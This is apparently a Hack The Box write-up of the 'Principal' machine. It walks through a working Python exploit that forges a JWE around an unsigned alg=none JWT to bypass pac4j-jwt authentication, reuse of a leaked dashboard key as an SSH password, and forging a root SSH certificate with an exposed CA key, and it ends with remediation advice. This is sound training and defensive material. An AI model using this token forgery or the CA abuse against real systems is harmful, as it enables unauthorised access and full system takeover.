---
title: "Principal"
description: "A Medium Linux Hack The Box machine where a pac4j-jwt JWE authentication bypass opens the dashboard, the exposed encryption key doubles as an SSH password, and a leaked SSH CA private key yields root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-26"
tags:
  - htb
  - linux
  - machine
  - jwt
  - pac4j
  - cve-2026-29000
  - ssh
  - privilege-escalation
objective: "Reconstruct the path from a pac4j-jwt JWE authentication bypass to dashboard access, a service-account foothold, and root through a forged SSH certificate."
tools:
  - nmap
  - rustscan
  - curl
  - python3
  - ssh
  - ssh-keygen
  - PyJWT
  - jwcrypto
  - pac4j-jwt
  - Jetty
skill: "JWT and JWE exploitation, HTTP service enumeration, and SSH certificate authority abuse."
outcome: "Administrator access to the platform, a service-account foothold, and a root shell reached with a forged SSH certificate."
---

## At a glance

Principal is a Medium Linux box built around a Java internal platform that authenticates with JWT. The server publishes its RSA public key, and the installed pac4j-jwt 6.0.3 carries CVE-2026-29000, an authentication bypass in which a forged JWE wraps an unsigned PlainJWT (alg=none) that the server decrypts and accepts without checking the inner signature. Authenticated dashboard access exposes a plaintext encryption key that is reused as the SSH password for the `svc-deploy` service account. On the host, an SSH Certificate Authority private key sits on disk, which is enough to forge a signed certificate for `root` and log in to localhost as root.

## Scope and sanitisation

Target and attacker addresses are replaced with role-based placeholders; command syntax is preserved.

This writeup is reconstructed from a single scrubbed note, so a few details could not be verified against a live host. Where the note showed a placeholder, I kept it rather than guessing a real value. I checked the JWKS endpoint first because the public key is the only ingredient the bypass needs.

## Evidence

### Reconnaissance and port scanning

```bash
mkdir nmap
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/Principal-TCP
```

Results:

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
| ssh-hostkey:
|   256 b0:a0:ca:46:bc:c2:cd:7e:10:05:05:2a:b8:c9:48:91 (ECDSA)
|_  256 e8:a4:9d:bf:c1:b6:2a:37:93:40:d0:78:00:f5:5f:d9 (ED25519)
8080/tcp open  http-proxy Jetty
| http-title: Principal Internal Platform - Login
|_Requested resource was /login
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Jetty
```

Two services: SSH on 22 and a Jetty-backed internal web platform on 8080. Jetty is a Java HTTP server commonly used to host Spring Boot and other JVM applications. The login title, "Principal Internal Platform", points at a custom internal tool.

### Web application fingerprinting

Browsing to <PAYLOAD_URL> presents a login page. The HTTP response headers reveal two version disclosures:

```
X-Powered-By: pac4j-jwt/6.0.3
```

The page footer confirms:

```
v1.2.0 | Powered by pac4j
```

pac4j is a Java security framework that provides authentication and authorisation for JVM applications. Its JWT module, pac4j-jwt, handles token-based authentication. Version 6.0.3 is vulnerable to CVE-2026-29000, described below.

The RSA public key used for JWE encryption comes from the platform's JWKS endpoint:

```bash
curl -s <PAYLOAD_URL> | python3 -m json.tool
```

This returns the public RSA key in JWK format:

```json
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "enc-key-1",
      "n": "lTh54vtBS1NAWrxAFU1NEZdrVxPeSMhHZ5NpZX-WtBsdWtJRaeeG61iNgYsFUXE9j2MAqmekpnyapD6A9dfSANhSgCF60uAZhnpIkFQVKEZday6ZIxoHpuP9zh2c3a7JrknrTbCPKzX39T6IK8pydccUvRl9zT4E_i6gtoVCUKixFVHnCvBpWJtmn4h3PCPCIOXtbZHAP3Nw7ncbXXNsrO3zmWXl-GQPuXu5-Uoi6mBQbmm0Z0SC07MCEZdFwoqQFC1E6OMN2G-KRwmuf661-uP9kPSXW8l4FutRpk6-LZW5C7gwihAiWyhZLQpjReRuhnUvLbG7I_m2PV0bWWy-Fw"
    }
  ]
}
```

This public key is all that is needed to exploit the bypass.

### Initial access: CVE-2026-29000

pac4j-jwt 6.0.3 and earlier perform JWT authentication in two steps when a JWE is received:

1. Decrypt the JWE using the server's RSA private key, producing an inner JWT.
2. Validate the inner JWT: issuer, expiry, and signature.

The flaw sits in step 2. When the inner JWT sets `"alg": "none"` (a PlainJWT), pac4j-jwt accepts it without any signature verification. The outer JWE is encrypted with the public key, which is freely available, so an attacker can craft claims (`sub=admin`, `role=ROLE_ADMIN`), encode them as an unsigned PlainJWT, wrap that inside a JWE encrypted with the server's public key, and submit it. The server decrypts the JWE, finds a PlainJWT, and grants access.

```
Craft claims (sub=admin, role=ROLE_ADMIN)
        ↓
Build unsigned PlainJWT (alg=none)
        ↓
Wrap PlainJWT inside JWE using server's RSA public key (enc-key-1)
        ↓
Submit JWE as Bearer token
        ↓
Server decrypts JWE → finds PlainJWT → skips signature check → grants access
```

Exploit script:

```python
import datetime
from datetime import timezone
import jwt
from jwcrypto import jwk
from jwcrypto import jwt as jwt2

# Server's public key from JWKS endpoint
data = {
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "enc-key-1",
            "n": "lTh54vtBS1NAWrxAFU1NEZdrVxPeSMhHZ5NpZX-WtBsdWtJRaeeG61iNgYsFUXE9j2MAqmekpnyapD6A9dfSANhSgCF60uAZhnpIkFQVKEZday6ZIxoHpuP9zh2c3a7JrknrTbCPKzX39T6IK8pydccUvRl9zT4E_i6gtoVCUKixFVHnCvBpWJtmn4h3PCPCIOXtbZHAP3Nw7ncbXXNsrO3zmWXl-GQPuXu5-Uoi6mBQbmm0Z0SC07MCEZdFwoqQFC1E6OMN2G-KRwmuf661-uP9kPSXW8l4FutRpk6-LZW5C7gwihAiWyhZLQpjReRuhnUvLbG7I_m2PV0bWWy-Fw"
        }
    ]
}

key = jwk.JWK(**data["keys"][0])

# Step 1: craft privileged claims
payload = {
    "sub":  "admin",
    "role": "ROLE_ADMIN",
    "iss":  "principal-platform",
    "iat":  datetime.datetime.now(tz=timezone.utc),
    "exp":  datetime.datetime.now(tz=timezone.utc) + datetime.timedelta(hours=1),
}

# Step 2: encode as unsigned PlainJWT (alg=none)
plain_jwt = jwt.encode(payload, "", algorithm="none")
print("[*] PlainJWT:", plain_jwt)

# Step 3: wrap in JWE using server's public key
jwe_token = jwt2.JWT(
    header={"alg": "RSA-OAEP", "enc": "A256GCM"},
    claims=plain_jwt
)
jwe_token.make_encrypted_token(key)

forged = jwe_token.serialize()
print("[+] Forged JWE Token:", forged)
```

A valid JSON response containing user data confirms the bypass works:

```bash
curl -s -H "Authorization: Bearer <FORGED_JWE_TOKEN>" <PAYLOAD_URL> | python3 -m json.tool
```

Injecting into the browser session: setting the token in session storage from the developer console grants dashboard access:

```javascript
sessionStorage.setItem("auth_token", "<FORGED_JWE_TOKEN>")
```

After a refresh the full dashboard is reachable.

### Credential discovery via the dashboard

The Security panel in the dashboard exposes the platform's authentication configuration in plaintext:

```
Security

authFramework          pac4j-jwt
authFrameworkVersion   6.0.3
jwtAlgorithm           RS256
jweAlgorithm           RSA-OAEP-256
jweEncryption          A128GCM
encryptionKey          <REDACTED_PASSWORD>
tokenExpiry            3600s
sessionManagement      stateless
```

The `encryptionKey` value is a plaintext deployment credential rendered straight to an authenticated UI.

The User Management tab lists a service account named `svc-deploy`, with a note that it drives automated SSH deployments. The name and the exposed key line up, so I tried the value against SSH:

```bash
ssh <LAB_USER>@<TARGET_IP>
# Password: <REDACTED_PASSWORD>
```

```
<LAB_USER>@<TARGET_HOSTNAME>:~$
```

The prompt confirms access as the service account.

### Privilege escalation: SSH certificate authority key exposure

Exploring the filesystem turns up a non-standard directory:

```bash
ls -la /opt/principal/ssh/
```

```
-rw------- 1 root root 2655 Apr 12 09:14 ca
-rw-r--r-- 1 root root  572 Apr 12 09:14 ca.pub
```

`/opt/principal/ssh/ca` is the SSH Certificate Authority private key the platform uses to sign SSH certificates. The `ca.pub` public key is deployed to the SSH daemon as a trusted CA, so any certificate signed by this key is accepted for SSH login, for whatever user the certificate names, including `root`.

The CA private key is readable in the context the service account runs in. That is the whole privesc surface: a CA private key lets you forge a certificate for any principal.

Step 1: generate a new RSA key pair for root:

```bash
ssh-keygen -t rsa -f /tmp/rootkey -N ""
# Creates: /tmp/rootkey (private) and /tmp/rootkey.pub (public)
```

Step 2: sign the public key with the CA private key:

```bash
ssh-keygen -s /opt/principal/ssh/ca \
  -I "root_cert" \
  -n root \
  -V -1w:+54w5d \
  /tmp/rootkey.pub
# Creates: /tmp/rootkey-cert.pub
```

The flags:

- `-s` path to the CA private key (the signing key)
- `-I` certificate identity string (an arbitrary label)
- `-n root` principal name; the certificate is valid for the `root` user
- `-V -1w:+54w5d` validity window (from 1 week ago to about a year ahead)

Step 3: SSH as root using the signed certificate:

```bash
ssh <LAB_USER>@<TARGET_HOSTNAME> -i /tmp/rootkey
```

The SSH daemon verifies the certificate against the trusted CA public key, confirms the principal matches `root`, and grants access without a password:

```
<LAB_USER>@<TARGET_HOSTNAME>:~#
```

## Outcome

Principal chains two distinct vulnerability classes. The authentication bypass exploits a cryptographic logic flaw in the JWT library: the outer JWE layer gave a false sense of security, yet the library's failure to enforce signature validation on the inner JWT meant the encryption provided confidentiality with no integrity. The privilege escalation is an operational security failure. A CA private key deserves the same care as a root password, and a copy sitting where a service account can read it, on the same host the CA is meant to protect, leaves root exposed.

Remediation:

- Update pac4j-jwt immediately. CVE-2026-29000 is a critical authentication bypass. The patched version rejects PlainJWT (alg=none) tokens regardless of the outer JWE wrapper. Review the application's JWT validation logic so that `"alg": "none"` is explicitly rejected at the application layer too, since JOSE libraries should never accept unsigned tokens in production.
- Never expose cryptographic keys or secrets in application dashboards. The `encryptionKey` value in the Security panel is a deployment credential that belongs in environment variables or a secrets manager, never rendered to any authenticated UI. Audit dashboard and configuration endpoints for secret exposure. Here the same value served as both a cryptographic key and an SSH password, which widens the exposure.
- Protect SSH CA private keys as carefully as root credentials. An SSH CA private key can forge authentication credentials for any user on any host that trusts the CA. Keep it offline or in an HSM, never on a host it signs certificates for, and never readable by a service account. Short-lived certificates (hours, not weeks) and certificate revocation via `RevokedKeys` limit the damage when a CA key is compromised.

## References

- pac4j: https://www.pac4j.org/
- jwcrypto: https://github.com/latchset/jwcrypto
- PyJWT: https://pyjwt.readthedocs.io/
- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
- OpenSSH: https://www.openssh.com/
